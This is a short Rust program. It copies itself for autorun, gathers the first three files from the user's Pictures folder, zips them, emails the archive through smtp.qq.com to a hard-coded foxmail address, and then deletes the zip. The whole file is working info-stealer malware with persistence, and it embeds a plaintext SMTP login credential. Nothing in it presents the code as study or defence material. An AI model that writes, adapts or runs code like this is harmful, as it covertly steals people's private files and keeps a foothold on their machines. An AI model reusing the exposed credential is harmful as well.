use std::fs::File;
use std::io::{Read, Write};
use walkdir::WalkDir;
use zip::write::FileOptions;
use lettre::{Message, SmtpTransport, Transport};
use lettre::message::{header, MultiPart, SinglePart};
use lettre::transport::smtp::authentication::Credentials;
mod add_autorun;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    add_autorun::self_copy();
    // 获取用户的图片目录
    let picture_dir = dirs::picture_dir().ok_or("无法获取图片目录")?;

    // 查找目录下的三张图片
    let mut image_paths = Vec::new();
    for entry in WalkDir::new(&picture_dir) {
        let entry = entry?;
        if entry.file_type().is_file() {
            image_paths.push(entry.path().to_path_buf());
            if image_paths.len() == 3 {
                break;
            }
        }
    }

    if image_paths.len() == 0 {
        return Err("没有找到图片".into());
    }

    // 创建ZIP文件
    let zip_file_path = picture_dir.join("images.zip");
    let zip_file = File::create(&zip_file_path)?;
    let mut zip = zip::ZipWriter::new(zip_file);

    let options = FileOptions::default().compression_method(zip::CompressionMethod::Stored);

    for image_path in image_paths {
        let mut buffer = Vec::new();
        let mut image_file = File::open(&image_path)?;
        image_file.read_to_end(&mut buffer)?;

        zip.start_file(image_path.file_name().unwrap().to_str().unwrap(), options)?;
        zip.write_all(&buffer)?;
    }
    zip.finish()?;

    // 读取压缩后的文件内容
    let mut zip_buffer = Vec::new();
    let mut zip_file = File::open(&zip_file_path)?;
    zip_file.read_to_end(&mut zip_buffer)?;

    // 配置邮件内容
    let email = Message::builder()
        .from("kyoshaft@foxmail.com".parse()?)
        .to("kyoshaft@foxmail.com".parse()?)
        .subject("Here are your images")
        .multipart(
            MultiPart::mixed()
                .singlepart(
                    SinglePart::builder()
                        .header(header::ContentType::TEXT_PLAIN)
                        .body(String::from("Please find the attached images.")),
                )
                .singlepart(
                    SinglePart::builder()
                        .header(header::ContentType::parse("application/zip").unwrap())
                        .header(header::ContentDisposition::attachment("images.zip"))
                        .body(zip_buffer),
                ),
        )?;

    // 配置SMTP客户端
    let creds = Credentials::new("kyoshaft@foxmail.com".to_owned(), "babrtwvjlnajdhii".to_owned());

    let mailer = SmtpTransport::relay("smtp.qq.com")?
        .credentials(creds)
        .build();

    // 发送邮件
    match mailer.send(&email) {
        Ok(_) => {
            println!("Email sent successfully!");
            std::fs::remove_file(&zip_file_path)?;  // 删除ZIP文件
        },
        Err(e) => eprintln!("Could not send email: {:?}", e),
    }

    Ok(())
}
